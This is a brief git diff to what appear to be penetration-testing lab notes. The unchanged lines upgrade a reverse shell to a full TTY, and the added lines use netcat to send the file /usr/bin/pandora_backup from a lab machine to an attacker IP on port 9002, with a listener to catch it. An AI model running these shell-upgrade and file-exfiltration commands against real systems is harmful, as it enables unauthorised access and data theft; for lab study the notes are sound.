@@ -16,3 +16,11 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ctrl+ Z
 
 stty raw -echo; fg
+
+
+sending files from Lab machine to attacker machine
+
+nc 10.10.14.41 9002 < /usr/bin/pandora_backup
+nc -nlvp 9002 > pandora_backup  
+
+
